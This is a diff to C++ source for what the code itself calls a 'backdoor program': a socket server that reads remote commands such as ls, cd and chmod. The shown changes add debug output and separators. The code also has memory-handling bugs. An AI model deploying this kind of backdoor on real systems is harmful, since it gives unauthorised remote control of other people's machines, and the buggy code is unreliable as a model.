@@ -1,3 +1,8 @@
+
+
+
+
+
 #include "BDServer.h"
 
 /*
@@ -92,16 +97,18 @@ void BDServer :: waitForCommand()
 {
   int amountRead;
   char buffer[MAX_PATH];
-
+  
   terminalLine();
   
   amountRead = read(_ClientSocket, buffer, MAX_PATH);
-  
   while(amountRead > 0){
+    printf("before trimming buffer: %s\n", buffer);
     trimLeft(buffer, strlen(buffer));
     trimRight(buffer, strlen(buffer));
+    printf("after trimming: %s\n", buffer);
     if (amountRead == 1){
       try{
+	write(_ClientSocket, "-----------------------------------------------\n", 49);
 	memcpy(buffer, "Empty command\n", 14);
 	write(_ClientSocket, buffer, 14);
 	memset(buffer, 0, MAX_PATH);
@@ -110,15 +117,21 @@ void BDServer :: waitForCommand()
 	break;
       }
     }else if(strncmp(buffer, "off", strlen(buffer)) == 0){
+      write(_ClientSocket, "-----------------------------------------------\n", 49);
       memcpy(buffer, "Shutting down.\n", 15);
       write(_ClientSocket, buffer, 14);
       return;
     }else if(strncmp(buffer, "help", strlen(buffer)) == 0){
+      write(_ClientSocket, "-----------------------------------------------\n", 49);      
       helpMenu();
     }else{
+      printf("before: %s\n", buffer);
+      write(_ClientSocket, "-----------------------------------------------\n", 49);
       //executeCommand(buffer);
+      printf("after: %s\n", buffer);
       parseCommand(buffer);
       memset(buffer, 0, MAX_PATH);
+      
       printf("Waiting for command...\n");
     }
     
@@ -198,10 +211,14 @@ void BDServer :: parseCommand(char* command){
   //ensures that arguments gets null terminated
   char* arguments = (char*)calloc(1024, 1);
   free(arguments);
+
+  printf("indside parseCommand: %s\n", command);
   
   //strtok modifies the past in string - make a copy.
   cpy = (char*)calloc(strlen(command), 1);
   memcpy(cpy, command, strlen(command));
+
+  printf("copied inside parseCommand: %s\n", cpy);
   
   //extract function - first characters up to space or tab
   function = strtok(cpy, " \t");
@@ -344,9 +361,7 @@ void BDServer :: executeCommand(char* command)
  */
 void BDServer :: helpMenu(){
   printf("Printing command list and descriptions...\n");
-  char buffer[MAX_PATH] = "Command listings:\n"
-    "-----------------------------------------------\n"
-    "[] indicates optional arguments, <> indicates required\n"
+  char buffer[MAX_PATH] = "[] indicates optional arguments, <> indicates required\n"
     "pwd		                - print working directory\n"
     "cd [dir]			- change directory to <dir>\n"
     "ls [params]		        - list directory contents\n"
@@ -361,7 +376,7 @@ void BDServer :: helpMenu(){
     "chmod <permissions> <file>	- change <file> accessibility to <permissions>\n"
     "help				- print this list of commands\n"
     "off				- terminate the backdoor program\n"
-    "-----------------------------------------------\n\n\0";
+    "\n\0";
   write(_ClientSocket, buffer, strlen(buffer)-1);
   memset(buffer, 0, MAX_PATH);
 }
